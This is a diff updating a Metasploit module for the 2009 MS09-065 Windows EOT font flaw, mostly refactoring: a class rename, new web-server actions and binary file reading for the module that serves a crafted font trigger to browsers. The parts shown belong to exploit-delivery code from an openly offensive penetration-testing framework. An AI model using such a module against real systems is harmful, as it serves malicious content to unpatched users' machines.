@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
 
   def initialize(info = {})
@@ -28,11 +23,14 @@ class Metasploit3 < Msf::Auxiliary
           [ 'MSB', 'MS09-065' ],
           [ 'OSVDB', '59869']
         ],
-      'DisclosureDate' => 'Nov 10 2009'
+      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+      'PassiveActions' => [ 'WebServer' ],
+      'DefaultAction'  => 'WebServer',
+      'DisclosureDate' => '2009-11-10'
     ))
     register_options([
       OptPath.new('EOTFILE', [ true, "The EOT template to use to generate the trigger", File.join(Msf::Config.data_directory, "exploits", "pricedown.eot")]),
-    ], self.class)
+    ])
 
   end
 
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_request_uri(cli, request)
     @tag ||= Rex::Text.rand_text_alpha(8)
-    @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']))
+    @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']), mode: 'rb')
 
     if(request.uri =~ /#{@tag}$/)
       content = @eot.dup
